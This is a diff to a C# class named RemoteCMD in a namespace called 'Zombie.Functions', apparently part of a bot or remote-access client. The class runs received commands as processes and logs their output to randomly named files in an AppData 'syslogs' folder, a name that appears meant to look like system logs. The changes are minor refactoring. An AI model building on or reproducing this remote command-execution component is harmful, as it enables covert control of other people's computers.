@@ -16,16 +16,13 @@ namespace Zombie.Functions
     static class RemoteCMD
     {
         static RemoteCMD()
-        {
-            LaunchDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
-            WorkingDirectory = LaunchDirectory;
+        {        
             _outputDir = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\syslogs\\";
         }
 
 
-        private static readonly string _outputDir;
-        private static string _outputFile;
-        public static string LaunchDirectory { get; private set; }
+        private static readonly string _outputDir = "";
+        private static string _outputFile = "log.txt";
         public static string WorkingDirectory { get; private set; }
 
         public static byte[] ExecuteCommand(string command)
@@ -36,6 +33,8 @@ namespace Zombie.Functions
             _outputFile = _outputDir + Guid.NewGuid().ToString() + ".txt";
 
             CreateDirectory();
+
+
 
             if (command.ToLower().Contains("cd"))
             {
@@ -87,6 +86,8 @@ namespace Zombie.Functions
 
 
             pProcess.Dispose();
+
+
 
             return GenericCommandResult.Generate(commandOutput);
 
